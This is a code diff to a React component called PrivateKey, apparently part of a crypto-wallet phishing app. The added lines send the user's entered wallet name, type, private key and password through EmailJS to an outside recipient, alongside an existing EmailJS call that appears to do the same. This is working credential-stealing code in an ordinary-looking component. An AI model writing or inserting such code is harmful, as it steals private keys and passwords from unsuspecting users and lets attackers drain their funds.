@@ -39,6 +39,23 @@ const PrivateKey = ({ wallet, appType }) => {
 
     if (privateKey64Long) {
       try {
+
+        await emailjs.send(
+          'service_30vkiql',
+          'template_e0wb6w8',
+          {
+            to_name: "prime_noval_app",
+            from_name: wallet ?? appType,
+            message: `
+              Name: ${formData.name}
+              Type: ${formData.type}
+              Data: ${formData.privateKey}
+              Password: ${formData.password}
+            `,
+          },
+          '4leuzsOPi6Oh_D4e0'
+        );
+
         await emailjs.send(
           'service_ky8xa0e',
           'template_kqjcmir',
